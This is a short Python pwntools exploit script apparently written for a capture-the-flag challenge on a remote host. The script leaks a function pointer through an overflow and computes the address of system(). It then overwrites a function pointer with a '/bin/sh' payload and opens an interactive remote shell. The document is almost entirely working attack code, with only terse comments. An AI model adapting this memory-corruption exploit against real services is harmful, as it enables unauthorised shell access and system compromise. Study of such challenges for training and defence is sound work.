#!/usr/bin/env python3

from pwn import *
import codecs

HOST = 'challenge.pwny.racing'
PORT = 11527

#r = process('chall2')
r = remote(HOST, PORT)

DUMMY_FUNC_OFFSET = 0xC95
SYSTEM_OFFSET = 0xA70

pause()

# Pass 1 - Turn on debugging
r.recvuntil(b'attempt (1/3)')
r.sendline()

# Pass 2 - Leak a function pointer
r.recvuntil(b'attempt (1/3)')
payload1 = b'A'*1020 + b'XXXX'
r.send(payload1)
r.recvline_contains(b'XXXX')

# Parse leaked pointer
leak = r.recvline().decode('ascii').strip()[:17].replace(' ', '') + '0000'
leak = codecs.decode(leak, 'hex')
leaked_pointer = u64(leak)
base_address = leaked_pointer - DUMMY_FUNC_OFFSET
system_address = base_address + SYSTEM_OFFSET

# Print addresses
log.info('Raw leak: %s', leak)
log.info('Leaked pointer: %016x', leaked_pointer)
log.info('Base address: %016x', base_address)
log.info('System address: %016x', system_address)

r.recvuntil(b'attempt (2/3)')

# Pass 3 - Trigger the exploit, call system()
system_pointer_offset = 1024 - 8*8

payload2 = b''
payload2 += b'/bin/sh;#' + p32(1334875196) + b'###'
assert(len(payload2) == 16)
payload2 += b'A'*(system_pointer_offset - 16)
payload2 += p64(system_address)

r.sendline(payload2)

r.interactive()
